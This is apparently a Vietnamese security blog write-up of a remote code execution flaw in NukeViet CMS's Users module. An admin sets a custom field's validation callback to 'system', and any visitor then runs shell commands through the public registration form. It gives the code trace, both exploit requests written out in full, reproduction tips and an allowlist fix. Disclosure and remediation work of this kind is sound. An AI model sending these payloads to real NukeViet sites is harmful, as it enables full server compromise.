---
layout: post
title: "F-001: Arbitrary PHP Function Call qua trường tùy chỉnh func_callback (NukeViet - module Users)"
date: 2026-08-30 00:00:00 +0700
categories: [Security, PHP, RCE]
---

> Tài liệu này mô tả một lỗ hổng Remote Code Execution (RCE) phát hiện trong module Users của NukeViet CMS, khai thác qua cơ chế `match_type=callback` trên trường dữ liệu tùy chỉnh (custom field). Mọi thử nghiệm được thực hiện trên môi trường lab/local do chính người viết triển khai — không nhắm vào hệ thống production của bên thứ ba.

## [](#header-0) Bug này hoạt động thế nào — giải thích không thuật ngữ

Module Users cho admin tạo **"trường dữ liệu tùy chỉnh"** khi đăng ký (ví dụ: thêm ô "Số CMND"). Với mỗi trường, admin chọn cách kiểm tra dữ liệu người dùng nhập, gọi là `match_type`. Có một kiểu là **`callback`**: admin gõ **tên một hàm PHP** vào ô cấu hình, hệ thống sẽ gọi hàm đó để kiểm tra giá trị người dùng nhập.

Ý định thiết kế: admin gõ tên hàm validator do chính họ viết, ví dụ `nv_check_phone_number`. Nhưng hệ thống **chỉ kiểm tra hàm đó có tồn tại hay không** (`function_exists()`), không kiểm tra hàm đó có phải một validator "an toàn" hay không. Mọi hàm PHP có sẵn của ngôn ngữ đều "tồn tại" — kể cả `system`, `exec`, `shell_exec` (các hàm chạy lệnh hệ điều hành).

Bug xảy ra qua **2 giai đoạn**, cần phân biệt rõ ai làm gì:

| Giai đoạn | Ai thực hiện | Hành động | Quyền cần |
|---|---|---|---|
| **1. Gài bẫy** | Admin quản trị module Users | Tạo field mới, đặt tên hàm callback = `system` | Chỉ cần quyền quản trị module Users (không cần GodAdmin) |
| **2. Kích nổ** | **Bất kỳ ai**, kể cả khách vãng lai chưa có tài khoản | Vào trang đăng ký công khai, gõ lệnh shell vào đúng ô field đó | Không cần quyền gì |

```
[Giai đoạn 1 — 1 lần, cần admin]
Admin → POST /admin/...&op=fields  (tạo field, func_callback = "system")
                                          │
                                          ▼
                          DB: users_field.func_callback = "system"
                                          │
[Giai đoạn 2 — lặp lại được bởi bất kỳ ai, mãi mãi cho đến khi bị xoá]
Khách vãng lai → POST /index.php?op=register
                    custom_fields[nv_poc_rce] = "id"
                                          │
                                          ▼
                 server chạy:  call_user_func("system", "id")
                            =  system("id")     ← RCE thật
```

Vì sao nghiêm trọng dù bước 1 cần quyền admin?

- Một admin module Users **bình thường không có quyền chạm server** — chỉ quản lý user. Bug này giúp họ **tự nâng quyền lên chạy lệnh bất kỳ trên toàn server**, vượt xa thiết kế phân quyền ban đầu (privilege escalation).
- Nếu tài khoản admin module Users đó từng bị lộ (phishing, XSS, dò mật khẩu yếu...), kẻ tấn công có được RCE toàn server mà không cần chiếm GodAdmin.
- Sau khi gài xong, bẫy **tồn tại vĩnh viễn**, ai cũng kích hoạt được qua trang đăng ký công khai, không cần tài khoản.

## [](#header-1) Tóm tắt

| Trường | Giá trị |
|---|---|
| Mức độ | **Critical** |
| CWE | CWE-749 (Exposed Dangerous Method/Function) / CWE-94 (Code Injection) |
| Loại | Arbitrary PHP function call → Remote Code Execution |
| Vai trò cần có | Admin quản trị module `users` (mod-admin cấp module, **không cần** GodAdmin/SPAdmin) |
| Impact | Toàn bộ server — RCE dưới quyền tiến trình PHP/web server |
| File lưu payload | `modules/users/admin/fields.php` |
| File thực thi payload | `modules/users/fields.check.php` |

## [](#header-2) Sink-to-source

# Data Flow: `func_callback` → `call_user_func()`

Đã xác minh trên code hiện tại của NukeViet. Luồng dữ liệu được trace theo hướng **Sink → Source** như sau:

```text
[SINK — Dynamic Function Call]
modules/users/fields.check.php:141-143

    } elseif ($row_f['match_type'] == 'callback') {
        if (function_exists($row_f['func_callback'])) {
            if (!call_user_func($row_f['func_callback'], $value)) {

    └─ $row_f['func_callback'] được sử dụng trực tiếp làm callable
       cho call_user_func()


```
![](/blog/assets/field.png)
Từ sink, trace ngược `$row_f['func_callback']` về nơi cấu hình:

```text
[Stored Configuration]
modules/users/admin/fields.php:372-390

    └─ func_callback được lưu vào {prefix}_users_field
       khi tạo mới custom field (fid=0)

[ĐẶT HÌNH #2 — fields.php:372-390]
        │
        ▼
[Source — Admin cấu hình callback]
modules/users/admin/fields.php:231-237

    $dataform['func_callback'] =
        ($dataform['match_type'] == 'callback')
            ? $nv_Request->get_string('match_callback', 'post', '', false)
            : '';

    └─ match_callback → func_callback
    └─ Chỉ kiểm tra function_exists()
    └─ Không có allowlist

[ĐẶT HÌNH #3 — fields.php:231-237]
```

Execution path để kích hoạt sink:

```text
[User Registration]
modules/users/funcs/register.php:189

    $custom_fields = $nv_Request->get_array('custom_fields', 'post');

[ĐẶT HÌNH #4 — register.php:189]
        │
        ▼
modules/users/funcs/register.php:279

    require NV_ROOTDIR . '/modules/users/fields.check.php';

[ĐẶT HÌNH #5 — register.php:279]
        │
        ▼
modules/users/fields.check.php:33-34

    $value = (isset($custom_fields[$row_f['field']]))
        ? $custom_fields[$row_f['field']]
        : '';

        └─ $value được truyền vào callback tại sink

[ĐẶT HÌNH #6 — fields.check.php:33-34]
```

Ngoài registration, cùng sink còn được sử dụng qua:

```text
modules/users/funcs/editinfo.php:552
modules/users/funcs/editinfo.php:897
modules/users/funcs/editinfo.php:1035
modules/users/admin/user_add.php:201
```

vì các flow này đều `require modules/users/fields.check.php`.

[ĐẶT HÌNH #7 — Các execution path khác]

**Lưu ý về sanitization:** `get_string('match_callback', 'post', '', false)` — `false` là tham số `$decode`, không phải `$filter`. NukeViet vẫn áp dụng filter mặc định cho POST. Tuy nhiên, điều này không giải quyết vấn đề vì root cause là **không có allowlist cho `func_callback`**, chỉ kiểm tra `function_exists()`.


## [](#header-3) Điều kiện khai thác

1. Có tài khoản admin với quyền quản trị module **Users** (không cần GodAdmin/SPAdmin).
2. `$global_config['allowuserreg']` khác `0` (cho phép đăng ký) — mặc định NukeViet bật (`register.php:27`).
3. Đặt `field_type = textbox` khi tạo field — nhánh `match_type=callback` chỉ tồn tại trong `textbox|textarea|editor` (`fields.php:229`).
4. Tên field không được trùng cột có sẵn trong bảng `{prefix}_users_info` và không nằm trong blocklist `includes/field_not_allow.php`.

## [](#header-4) Khai thác — Giai đoạn 1: Gài bẫy

Admin tạo field mới (`fid=0`, **không phải sửa field có sẵn**) với payload dạng:

```
save=1&fid=0&system=0&title=PoC+RCE&description=PoC&required=0&show_register=1&user_editable=1&show_profile=1&class=&field_type=textbox&field=nv_poc_rce&match_type=callback&match_callback=system&min_length=0&max_length=100&default_value=
```

| Tham số | Giá trị | Vì sao |
|---|---|---|
| `fid` | `0` | **Bắt buộc**. Khác 0 → server coi đây là request SỬA field có sẵn và ghi đè `field`/`field_type` từ DB, bỏ qua ý định của payload |
| `field` | `nv_poc_rce` | Tên field mới. Server đọc tham số `field` để đặt tên, không phải `fieldid` |
| `field_type` | `textbox` | Bắt buộc để nhánh `match_type=callback` được xử lý |
| `match_type` | `callback` | Kích hoạt việc lưu `func_callback` |
| `match_callback` | `system` | Hàm PHP nguy hiểm — có thể đổi thành `exec`, `passthru`, `shell_exec` |

Response mong đợi: `302 Found` redirect về trang danh sách field (`fields.php:466`) — nghĩa là INSERT thành công.

**Lưu ý quan trọng khi tái tạo:** nếu bấm "Sửa" một field có sẵn thay vì "Thêm trường mới" (`fid` khác 0), server sẽ **ghi đè** `field_type` từ DB (`fields.php:194-204`):

```php
$dataform['field_type'] = $dataform_old['field_type'];       // lấy từ DB, không lấy từ POST
$dataform['field'] = $dataform['fieldid'] = $dataform_old['field'];
```

Nếu field cũ vốn là kiểu "lựa chọn" (dropdown/checkbox), code sẽ ép cứng `match_type='none'`, `func_callback=''` (`fields.php:317-319`) — dù request có gửi `match_type=callback` cũng bị xoá âm thầm trước khi ghi DB. Request vẫn trả `302` bình thường nên dễ nhầm là đã thành công. Bắt buộc phải tạo field mới (`fid=0`) từ đầu, không thể "biến hình" field có sẵn.

## [](#header-5) Khai thác — Giai đoạn 2: Kích hoạt sink

Bất kỳ ai — kể cả người dùng chưa có tài khoản — gửi request đăng ký với field vừa bị gài bẫy:

```
POST /index.php?nv=users&op=register
...
custom_fields[nv_poc_rce]=id
```

Server thực thi:

```php
call_user_func('system', 'id');   // = system('id')
```

Vì đây là endpoint `nv_jsonOutput()` không có buffering, output của `system()` được in **trực tiếp**, xuất hiện ở đầu body response, **trước** phần JSON `{"status":...}` — ví dụ:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data){"status":...}
```

Đây chính là bằng chứng RCE.

**Lưu ý khi lặp lại:**
- `username`/`email` trùng lần đăng ký trước sẽ bị chặn sớm ở `nv_check_username_reg`/`nv_check_email_reg` (`register.php:234,242`) trước khi chạm sink — cần đổi giá trị mỗi lần test.
- Ký tự `[`/`]` trong lệnh shell bị NukeViet mã hoá thành `&#91;`/`&#93;` trước khi lưu (`Request.php:1041`) — tránh dùng nếu không cần thiết.

## [](#header-6) Impact tổng hợp

- **Remote Code Execution** dưới quyền tiến trình web server, kích hoạt lặp lại vô hạn lần bởi bất kỳ ai truy cập trang đăng ký công khai.
- **Privilege escalation**: một tài khoản chỉ có quyền quản trị module Users (không phải GodAdmin) có thể tự nâng quyền lên chạy lệnh hệ thống tuỳ ý.
- **Persistence**: bẫy tồn tại vĩnh viễn trong DB cho tới khi bị phát hiện và xoá thủ công — không để lại dấu vết bất thường nào trong luồng vận hành bình thường của admin panel.
- Cùng sink còn bị kích hoạt qua luồng sửa hồ sơ (`editinfo.php`) và admin tạo user hộ (`user_add.php`), mở rộng bề mặt tấn công.

## [](#header-7) Khắc phục

Tại `modules/users/admin/fields.php:231-236`, thay cơ chế `function_exists()` bằng **allowlist cứng**:

```php
$allowed_callbacks = [
    'nv_check_valid_email',
    'nv_check_valid_login',
    // ... chỉ các validator nội bộ đã được rà soát
];
$dataform['func_callback'] = ($dataform['match_type'] == 'callback')
    ? $nv_Request->get_string('match_callback', 'post', '', false)
    : '';
if (!in_array($dataform['func_callback'], $allowed_callbacks, true)) {
    $dataform['func_callback'] = '';
}
```

Về lâu dài, nên cân nhắc bỏ hẳn kiểu `match_type=callback` nếu tính năng không thực sự cần thiết cho vận hành — đây là mẫu thiết kế "chấp nhận cấu hình admin làm code" (admin-configurable code execution), rủi ro cố hữu ngay cả khi có allowlist, vì bất kỳ hàm nào lọt qua allowlist trong tương lai (do thêm nhầm, do refactor) đều khôi phục lại toàn bộ lỗ hổng.

## [](#header-8) Kết luận

Lỗ hổng này là một ví dụ điển hình của **CWE-749 (Exposed Dangerous Method or Function)**: một tính năng hợp pháp (cho phép admin định nghĩa validator tuỳ chỉnh) bị lạm dụng vì thiếu allowlist ở lớp kiểm tra đầu vào. Điểm đáng chú ý là chuỗi khai thác đòi hỏi hai vai trò khác nhau — admin module để "gài bẫy" và bất kỳ ai để "kích nổ" — khiến bug dễ bị đánh giá thấp mức độ nghiêm trọng nếu chỉ nhìn riêng lẻ từng bước mà không truy vết toàn bộ luồng source-to-sink.

*(Ảnh minh họa sẽ được bổ sung sau.)*
